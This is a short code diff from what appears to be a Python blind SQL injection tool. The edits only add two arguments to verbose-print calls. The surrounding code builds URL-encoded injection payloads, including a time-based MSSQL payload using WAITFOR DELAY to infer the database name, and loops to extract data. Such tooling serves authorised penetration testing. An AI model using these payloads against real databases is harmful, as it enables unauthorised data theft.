@@ -12,7 +12,7 @@ from pysqllib.commonfunc import *
 
 def is_contain(sender, payload, data):
     if args.p.verbose:
-        print_verbose(payload)
+        print_verbose(payload, args.left, args.right)
     else:
         print(f"\r{' ' * (len(data) + 1)}", end='')
         print(f"\r{data}", end='')
@@ -78,7 +78,7 @@ def retr_loop(sender, payload1, payload2, payload3, tab_or_col=False, possible_h
         payload = payload1 + urlenc(not_in) + payload2
 
         if args.p.verbose:
-            print_verbose(payload + payload3)
+            print_verbose(payload + payload3, args.left, args.right)
 
         for _ in range(sender.retry):
             try:
@@ -110,7 +110,7 @@ def retr_database(sender):
     payload3 = urlenc("IF (EXISTS(SELECT DB_NAME() WHERE DB_NAME() like '")
     payload4 = urlenc("')) WAITFOR DELAY '0:0:" + str(args.sleep_sec) + "'")
     if args.p.verbose:
-        print_verbose(payload3 + payload4)
+        print_verbose(payload3 + payload4, args.left, args.right)
     content = retr_loop2(sender, payload3, payload4)
     print(f"\rcurrent: {content}")
 
